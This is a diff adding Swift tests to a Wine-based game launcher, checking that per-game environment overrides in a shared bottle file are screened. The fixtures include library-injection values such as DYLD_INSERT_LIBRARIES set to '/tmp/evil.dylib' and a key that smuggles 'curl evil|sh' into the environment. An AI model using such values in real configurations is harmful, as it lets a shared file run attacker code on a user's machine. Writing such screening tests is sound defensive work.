@@ -128,6 +128,60 @@ import Testing
     }
 
     @Test
+    func perGameOverridesCannotRedirectTheNativeLoader() throws {
+        let (prefix, driveC) = try makePrefix()
+        defer { try? fm.removeItem(at: prefix) }
+        // What a shared .fbottle's bottle.json could carry for a game.
+        let game = Game(
+            name: "D", executablePath: "Games/Demo/demo.exe",
+            environment: [
+                "DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
+                "dyld_library_path": "/tmp",
+                "WINELOADER": "/tmp/evil",
+                "WINESERVER": "/tmp/evil",
+                "WINEDLLPATH": "/tmp/evil",
+                "X=1;curl evil|sh;Y": "1",
+                "DXVK_HUD": "fps",                     // ordinary tuning still applies
+            ]
+        )
+        let plan = try plan(game: game, bottle: Bottle(name: "B", graphicsBackend: .dxvk),
+                            prefix: prefix, driveC: driveC)
+
+        for refused in ["DYLD_INSERT_LIBRARIES", "dyld_library_path", "WINELOADER",
+                        "WINESERVER", "WINEDLLPATH", "X=1;curl evil|sh;Y"] {
+            #expect(plan.environment[refused] == nil, Comment(rawValue: refused))
+            #expect(plan.refusedEnvironmentKeys.contains(refused), Comment(rawValue: refused))
+        }
+        #expect(plan.environment["DXVK_HUD"] == "fps")
+        #expect(plan.refusedEnvironmentKeys == plan.refusedEnvironmentKeys.sorted())
+    }
+
+    @Test
+    func screeningOnlyTouchesThePerGameLayer() throws {
+        let (prefix, driveC) = try makePrefix()
+        defer { try? fm.removeItem(at: prefix) }
+        // Fable's own layers may set loader variables (Winetricks sets
+        // WINESERVER today); the screen must not strip those.
+        let plan = try plan(
+            game: Game(name: "D", executablePath: "Games/Demo/demo.exe"),
+            bottle: Bottle(name: "B"), prefix: prefix, driveC: driveC,
+            base: ["WINEDLLOVERRIDES": "mscoree,mshtml=", "WINESERVER": "/fable/wineserver"]
+        )
+        #expect(plan.environment["WINESERVER"] == "/fable/wineserver")
+        #expect(plan.refusedEnvironmentKeys.isEmpty)
+    }
+
+    @Test
+    func screenedOverridesRules() {
+        let (applied, refused) = WineEnv.screenedOverrides([
+            "MTL_HUD_ENABLED": "1", "_PRIVATE2": "x",
+            "DYLD_FALLBACK_LIBRARY_PATH": "/x", "2BAD": "x", "": "x", "A B": "x",
+        ])
+        #expect(applied == ["MTL_HUD_ENABLED": "1", "_PRIVATE2": "x"])
+        #expect(refused == ["", "2BAD", "A B", "DYLD_FALLBACK_LIBRARY_PATH"])
+    }
+
+    @Test
     func dxvkRoutesDLLsNativeAndCarriesTheCap() throws {
         let (prefix, driveC) = try makePrefix()
         defer { try? fm.removeItem(at: prefix) }
